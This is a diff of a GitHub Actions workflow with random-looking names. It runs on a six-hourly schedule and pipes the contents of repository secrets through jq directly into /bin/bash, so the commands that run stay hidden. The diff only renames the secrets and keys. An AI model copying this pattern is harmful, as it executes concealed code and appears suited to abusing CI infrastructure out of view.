@@ -1,22 +1,22 @@
 name: zhaojinan7890
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
+    - cron: '53 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaojinan7890
         env:
-          kqsfg48: ${{ secrets.kqsfg48 }}
+          eo81471: ${{ secrets.eo81471 }}
         run: |
-          echo $kqsfg48 | jq -r .qfpwi66857 | /bin/bash
-          echo $wjbea89508 | jq -r .cqxt1 | /bin/bash
-          echo $ixdo6311 | jq -r .n5188 | /bin/bash
-          echo $hq2988 | jq -r .yiii1 | /bin/bash
-          echo $kvnf73 | jq -r .pojt62 | /bin/bash
+          echo $eo81471 | jq -r .gvz46 | /bin/bash
+          echo $srfpo85103 | jq -r .oi25 | /bin/bash
+          echo $rf3495 | jq -r .q39 | /bin/bash
+          echo $l837 | jq -r .xch99708 | /bin/bash
+          echo $aqt37 | jq -r .nre300 | /bin/bash
 
